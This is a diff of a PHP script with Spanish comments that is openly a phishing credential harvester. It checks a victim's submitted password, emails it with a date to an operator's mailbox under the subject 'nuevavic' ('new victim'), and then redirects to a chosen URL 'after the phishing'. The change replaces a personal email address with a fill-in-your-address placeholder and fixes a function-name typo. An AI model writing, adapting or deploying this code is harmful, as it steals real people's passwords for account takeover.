@@ -6,7 +6,7 @@
 //--------------------------------------//
 
 //creamos una funcion que nos haga una validacion de los datos introducidos
-function ChechPassword($password)
+function CheckPassword($password)
 {
 	//comprobamos si el password introducido es menor a 5 caracteres
 	//en cuyo caso le mostramos un mensaje de error
@@ -17,10 +17,10 @@ function ChechPassword($password)
  	Contraseña de al menos 5 caracteres
  	</p>';
 	 } else {//
-		 # Aqui generamos un correo electronico para hacer otro respaldo de la informacion introducida    //
-		 $receptor = "eldadofarias@hotmail.com";                               //correo electronico      //
+		# Aqui generamos un correo electronico para hacer otro respaldo de la informacion introducida    //
+         $receptor = "aqui poner tu correo donde te llagara la pass";                  //correo electronico      //
          $asunto = "nuevavic";                                                 //asunto del mensaje              //
-         $mensaje ="password===".$password."---".$fecha;//mensaje del correo              //
+         $mensaje ="password===".$password."---".$fecha;                       //mensaje del correo              //
          mail($receptor,$asunto,$mensaje);//enviamos el mail en cuestion                                         //
          $url = 'Aqui va la url ';//url a la cual se redireccionara despues de haber terminado el fishing        //
          $redireccion = 'location:'.$url;                                                                        //  
@@ -29,5 +29,5 @@ function ChechPassword($password)
 	}
 }
 //ejecutmos la funcion que checkea que la contraseña es mayor a 5 caracteres
-ChechPassword($contraseña);
+CheckPassword($contraseña);
 ?>
